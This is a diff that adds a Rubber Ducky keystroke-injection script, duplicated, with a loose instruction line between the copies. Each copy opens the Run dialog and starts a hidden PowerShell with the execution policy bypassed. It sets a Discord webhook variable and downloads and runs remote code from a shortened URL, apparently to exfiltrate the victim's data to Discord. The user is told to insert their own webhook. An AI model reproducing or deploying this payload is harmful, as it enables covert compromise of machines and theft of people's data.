@@ -1,0 +1,24 @@
+
+
+
+
+REM Setup for script
+DEFAULT_DELAY 100
+
+REM open powershell (remove -W Hidden to show the window)
+DELAY 1000
+GUI r
+DELAY 750
+STRING powershell -NoP -Ep Bypass -W H -C $dc='WEBHOOK_HERE'; irm is.gd/bw0_ex_to_dc | iex
+ENTER
+ replace WEBHOOK_HERE with your Discord Webhook.
+
+REM some setup for dukie script
+DEFAULT_DELAY 100
+
+REM open powershell (remove -W Hidden to show the window)
+DELAY 1000
+GUI r
+DELAY 750
+STRING powershell -NoP -Ep Bypass -W H -C $dc='WEBHOOK_HERE'; irm is.gd/bw0_ex_to_dc | iex
+ENTER
